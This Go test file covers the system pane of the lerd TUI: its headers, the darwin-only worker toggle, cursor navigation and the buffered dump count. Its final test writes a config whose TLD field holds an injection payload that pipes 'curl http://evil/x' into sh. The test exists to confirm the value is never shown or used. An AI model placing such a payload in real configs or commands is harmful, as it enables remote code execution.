package tui

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/geodro/lerd/internal/dns"
)

// TestSystemRows_ContainsCoreSections checks every section header the system
// page promises (DNS, Nginx, Watcher, Notifications, Debug bridge, PHP, Node,
// Lerd) is rendered. Worker mode is platform-gated and tested separately.
func TestSystemRows_ContainsCoreSections(t *testing.T) {
	m := NewModel("test")
	rows := m.systemRows()

	want := []string{"DNS", "Nginx", "Watcher", "Notifications", "Debug bridge", "PHP versions", "Node", "Lerd"}
	have := map[string]bool{}
	for _, r := range rows {
		if r.kind == sysHeader {
			have[r.label] = true
		}
	}
	for _, w := range want {
		if !have[w] {
			t.Errorf("missing section header %q in system rows", w)
		}
	}
}

// TestSystemRows_WorkerModeOnlyOnDarwin matches the existing settings rule —
// Linux always runs workers under systemd, so a worker-mode toggle there is
// meaningless and must not be advertised.
func TestSystemRows_WorkerModeOnlyOnDarwin(t *testing.T) {
	m := NewModel("test")
	rows := m.systemRows()

	found := false
	for _, r := range rows {
		if r.kind == sysWorkerMode {
			found = true
			break
		}
	}

	wantPresent := runtime.GOOS == "darwin"
	if found != wantPresent {
		t.Errorf("worker-mode row present=%v on %s, want present=%v",
			found, runtime.GOOS, wantPresent)
	}
}

// TestNavigableSystemRows_SkipsHeadersAndInfo verifies the cursor only lands
// on interactive rows; header and info rows are scenery.
func TestNavigableSystemRows_SkipsHeadersAndInfo(t *testing.T) {
	rows := []systemRow{
		{kind: sysHeader, label: "X"},
		{kind: sysInfo, label: "a"},
		{kind: sysDumpsEnabled, label: "Dumps"},
		{kind: sysInfo, label: "b"},
		{kind: sysNotifEnabled, label: "Notif"},
		{kind: sysHeader, label: "Y"},
		{kind: sysAutostart, label: "Auto"},
	}
	nav := navigableSystemRows(rows)
	if len(nav) != 3 {
		t.Fatalf("expected 3 navigable rows, got %d", len(nav))
	}
	for _, idx := range nav {
		kind := rows[idx].kind
		if kind == sysHeader || kind == sysInfo {
			t.Errorf("navigable index %d points to non-interactive kind %v", idx, kind)
		}
	}
}

// The System window names itself and says how to leave, now in the frame's
// breadcrumb rather than inside the content.
func TestSystemWindow_RendersTitleAndWayBack(t *testing.T) {
	m := NewModel("test")
	m.width, m.height = 120, 40
	m.switchTab(tabSites)
	m.detailMode = detailSystem
	joined := stripANSI(m.renderSitesMain(110, 38))
	if !strings.Contains(joined, "System") {
		t.Errorf("system window should render its title:\n%s", joined)
	}
	if !strings.Contains(joined, "esc back to the site") {
		t.Errorf("system window should say how to return:\n%s", joined)
	}
}

// TestSystemContentLines_CursorLineLandsOnInteractiveRow ensures the
// reported cursor row index actually corresponds to a toggleable row in
// the output, so the viewport will keep the selection visible.
func TestSystemContentLines_CursorLineLandsOnInteractiveRow(t *testing.T) {
	m := NewModel("test")
	m.systemRow = 0
	lines, cursorLine := systemContentLinesWithCursor(m, true, 100)
	if cursorLine == 0 {
		// 0 means "no interactive row rendered" — the page must always have
		// at least the notifications toggle, so this is a regression.
		t.Fatal("expected cursorLine > 0 when at least one interactive row exists")
	}
	if cursorLine >= len(lines) {
		t.Fatalf("cursorLine %d out of bounds (%d lines)", cursorLine, len(lines))
	}
	// The selected line should carry the inverted accent prefix used by
	// renderDetailRow — "▸" is the universal marker for the focused row.
	if !strings.Contains(lines[cursorLine], "▸") {
		t.Errorf("cursor line %q lacks the ▸ marker", lines[cursorLine])
	}
}

// TestSystemRows_DumpsInfoShowsBufferedCount uses the actual buffered count
// from the model so users see the same number the Dumps view shows.
func TestSystemRows_DumpsInfoShowsBufferedCount(t *testing.T) {
	m := NewModel("test")
	m.appendDebug(dumpEv(DumpEntry{ID: "a"}))
	m.appendDebug(dumpEv(DumpEntry{ID: "b"}))

	rows := m.systemRows()
	var bufferedRow systemRow
	for _, r := range rows {
		if r.kind == sysInfo && r.label == "Buffered" {
			bufferedRow = r
			break
		}
	}
	if !strings.Contains(bufferedRow.value, "2 events") {
		t.Errorf("expected 'Buffered: 2 events', got %q", bufferedRow.value)
	}
}

// The TUI must name the suffix the dnsmasq config was written from. Showing the
// raw dns.tld left the pane claiming a TLD nothing serves, and probing it left
// the status permanently down (#1559).
func TestSystemRows_ShowsTheServedTLD(t *testing.T) {
	cfgHome := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", cfgHome)
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	dir := filepath.Join(cfgHome, "lerd")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	body := "dns:\n  enabled: false\n  tld: \"bad'; curl http://evil/x | sh; #\"\n"
	if err := os.WriteFile(filepath.Join(dir, "config.yaml"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}

	for _, r := range NewModel("test").systemRows() {
		if r.kind == sysInfo && r.label == "TLD" {
			if r.value != dns.DefaultTLD {
				t.Errorf("TLD row shows %q, but the writer serves %q", r.value, dns.DefaultTLD)
			}
			return
		}
	}
	t.Fatal("no TLD row in the system pane")
}
